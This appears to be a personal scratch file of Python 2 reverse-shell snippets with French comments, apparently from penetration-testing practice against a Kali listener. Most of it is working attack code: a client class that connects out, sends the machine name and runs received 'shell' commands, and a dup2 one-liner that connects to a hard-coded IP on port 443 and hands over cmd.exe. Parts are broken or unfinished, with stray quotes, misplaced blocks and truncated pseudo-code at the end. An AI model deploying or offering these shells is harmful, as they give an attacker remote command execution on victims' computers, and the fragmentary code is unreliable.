#reverseshell-st


# coding: utf-8

import socket

hote = "10.101.200.38"
port = 1234

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.connect((hote, port))
print "Connection on {}".format(port)

socket.send(u"Hey my name is Olivier!")

print "Close"
socket.close()


#------------------------------

#Lancer une connexion vers le port 1234 de KALI

# coding: utf-8

import socket, os, subprocess, sys, re

class ReverseShellClient:

    s = None

    def connect(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = int(port)
        try:
            print '[!] trying to connect to %s:%s' % (host, port)
            self.s.connect((host, port))
            print '[*] connection established'
            self.s.send(os.environ['COMPUTERNAME'])
        except:
            print >> sys.stderr, 'could not connect'

    def receive(self):
        received = self.s.recv(1024)
        tokens = re.split('\s+', received, 1)
        command = tokens[0]
        if command == 'quit':
            self.s.close()
        elif command == 'shell':
            if len(tokens) > 1:
                proc2 = subprocess.Popen(tokens[1], shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE)
                output = proc2.stdout.read() + proc2.stderr.read()
            else:
                output = 'args must follow "shell"'
        else:
            output = 'valid input is "quit" or "shell <cmd>" (e.g. "shell dir")'
            self.send(output)

    def send(self, output):
        self.s.send(output)
        self.receive()

    def stop():
        self.s.close()

    if __name__ == '__main__':
        from argparse import ArgumentParser
        p = ArgumentParser()
        p.add_argument('host')
        p.add_argument('--port', '-p', type=int, default=58777)
        args = p.parse_args()
        client = ReverseShellClient()
        client.connect(args.host, args.port)
        client.receive()
        client.stop()


-------------------------------------------------


import socket,subprocess,os;

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('10.11.0.232',443));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);

p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe','-i']);"




p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

--------

import socket, subprocess, sys, os

hote = "10.101.200.38"
port = 1234

def connect((hote,port)):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hote, port))
    print "Connection on {}".format(port)



p=subprocess.Popen(["\\windows\\system32\\cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

---------------------


https://gist.github.com/mike10004/2291abeb8825b3f73fee

Envoyer le chemin

While True
	p=
	S